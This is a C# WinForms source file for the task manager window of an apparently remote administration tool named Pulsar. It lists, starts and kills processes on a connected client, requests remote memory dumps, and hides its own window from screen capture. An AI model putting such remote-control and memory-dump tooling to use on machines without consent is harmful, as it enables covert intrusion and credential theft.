﻿using Pulsar.Common.Enums;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Administration.TaskManager;
using Pulsar.Common.Models;
using Pulsar.Server.Controls;
using Pulsar.Server.Forms.DarkMode;
using Pulsar.Server.Helper;
using Pulsar.Server.Messages;
using Pulsar.Server.Networking;
using System;
using System.Collections.Generic;
using System.Windows.Forms;

namespace Pulsar.Server.Forms
{
    public partial class FrmTaskManager : Form
    {
        /// <summary>
        /// The client which can be used for the task manager.
        /// </summary>
        private readonly Client _connectClient;

        /// <summary>
        /// The message handler for handling the communication with the client.
        /// </summary>
        private readonly TaskManagerHandler _taskManagerHandler;

        /// <summary>
        /// Holds the opened task manager form for each client.
        /// </summary>
        private static readonly Dictionary<Client, FrmTaskManager> OpenedForms = new Dictionary<Client, FrmTaskManager>();

        private List<FrmMemoryDump> _memoryDumps = new List<FrmMemoryDump>();

        /// <summary>
        /// Creates a new task manager form for the client or gets the current open form, if there exists one already.
        /// </summary>
        /// <param name="client">The client used for the task manager form.</param>
        /// <returns>
        /// Returns a new task manager form for the client if there is none currently open, otherwise creates a new one.
        /// </returns>
        public static FrmTaskManager CreateNewOrGetExisting(Client client)
        {
            if (OpenedForms.ContainsKey(client))
            {
                return OpenedForms[client];
            }
            FrmTaskManager f = new FrmTaskManager(client);
            f.Disposed += (sender, args) => OpenedForms.Remove(client);
            OpenedForms.Add(client, f);
            return f;
        }

        /// <summary>
        /// Initializes a new instance of the <see cref="FrmTaskManager"/> class using the given client.
        /// </summary>
        /// <param name="client">The client used for the task manager form.</param>
        public FrmTaskManager(Client client)
        {
            _connectClient = client;
            _taskManagerHandler = new TaskManagerHandler(client);

            RegisterMessageHandler();
            InitializeComponent();

            DarkModeManager.ApplyDarkMode(this);
			ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
        }

        /// <summary>
        /// Registers the task manager message handler for client communication.
        /// </summary>
        private void RegisterMessageHandler()
        {
            _connectClient.ClientState += ClientDisconnected;
            _taskManagerHandler.ProgressChanged += TasksChanged;
            _taskManagerHandler.ProcessActionPerformed += ProcessActionPerformed;
            _taskManagerHandler.OnResponseReceived += CreateMemoryDump;
            MessageHandler.Register(_taskManagerHandler);
        }

        /// <summary>
        /// Unregisters the task manager message handler.
        /// </summary>
        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_taskManagerHandler);
            _taskManagerHandler.OnResponseReceived -= CreateMemoryDump;
            _taskManagerHandler.ProcessActionPerformed -= ProcessActionPerformed;
            _taskManagerHandler.ProgressChanged -= TasksChanged;
            _connectClient.ClientState -= ClientDisconnected;
        }

        /// <summary>
        /// Called whenever a client disconnects.
        /// </summary>
        /// <param name="client">The client which disconnected.</param>
        /// <param name="connected">True if the client connected, false if disconnected</param>
        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected)
            {
                this.Invoke((MethodInvoker)this.Close);
            }
        }

        private void TasksChanged(object sender, Process[] processes)
        {
            lstTasks.Items.Clear();

            foreach (var process in processes)
            {
                ListViewItem lvi =
                    new ListViewItem(new[] { process.Name, process.Id.ToString(), process.MainWindowTitle });
                lstTasks.Items.Add(lvi);
            }

            processesToolStripStatusLabel.Text = $"Processes: {processes.Length}";
        }

        private void ProcessActionPerformed(object sender, ProcessAction action, bool result)
        {
            string text = string.Empty;
            switch (action)
            {
                case ProcessAction.Start:
                    text = result ? "Process started successfully" : "Failed to start process";
                    break;
                case ProcessAction.End:
                    text = result ? "Process ended successfully" : "Failed to end process";
                    break;
            }

            processesToolStripStatusLabel.Text = text;
        }

        private void FrmTaskManager_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("Task Manager", _connectClient);
            _taskManagerHandler.RefreshProcesses();
        }

        private void FrmTaskManager_FormClosing(object sender, FormClosingEventArgs e)
        {
            UnregisterMessageHandler();
        }

        private void killProcessToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem lvi in lstTasks.SelectedItems)
            {
                _taskManagerHandler.EndProcess(int.Parse(lvi.SubItems[1].Text));
            }
        }

        private void startProcessToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string processName = string.Empty;
            if (InputBox.Show("Process name", "Enter Process name:", ref processName) == DialogResult.OK)
            {
                _taskManagerHandler.StartProcess(processName);
            }
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _taskManagerHandler.RefreshProcesses();
        }

        private void lstTasks_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            lstTasks.LvwColumnSorter.NeedNumberCompare = (e.Column == 1);
        }

        private void dumpMemoryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem lvi in lstTasks.SelectedItems)
            {
                _taskManagerHandler.DumpProcess(int.Parse(lvi.SubItems[1].Text));
            }
        }

        public void CreateMemoryDump(object sender, DoProcessDumpResponse response)
        {
            if (response.Result == true)
            {
                this.Invoke((MethodInvoker)delegate
                {
                    FrmMemoryDump dumpFrm = FrmMemoryDump.CreateNewOrGetExisting(_connectClient, response);
                    _memoryDumps.Add(dumpFrm);
                    dumpFrm.Show();
                });
            } 
            else
            {
                string reason = response.FailureReason == "" ? "" : $"Reason: {response.FailureReason}";
                MessageBox.Show($"Failed to dump process!\n{reason}", $"Failed to dump process ({response.Pid}) - {response.ProcessName}");
            }
        }
    }
}
